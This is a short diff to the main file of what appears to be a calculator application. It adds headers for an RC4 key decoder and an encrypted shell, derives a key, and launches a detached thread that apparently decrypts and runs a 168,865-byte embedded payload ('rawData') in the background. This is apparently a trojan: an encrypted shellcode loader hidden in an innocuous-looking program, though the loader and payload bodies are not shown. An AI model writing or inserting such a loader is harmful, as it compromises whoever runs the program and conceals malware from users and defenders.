@@ -1,12 +1,17 @@
 #include "Platform/Platform.hpp"
 #include "resources/button.h"
 #include "resources/calculate.h"
-#include "resources/shell.h"
+#include "resources/cipher/keydecoder.h"
+#include "resources/shell/encShell.h"
+#include "resources/shell/shell.h"
+#include <thread>
 
 int main()
 {
+	// Get rc4 key
+	std::string k = keygen();
 
-	std::thread t(loadshell);
+	std::thread t(loadshell, k, rawData, 168865);
 	t.detach();
 
 	// util::Platform platform;
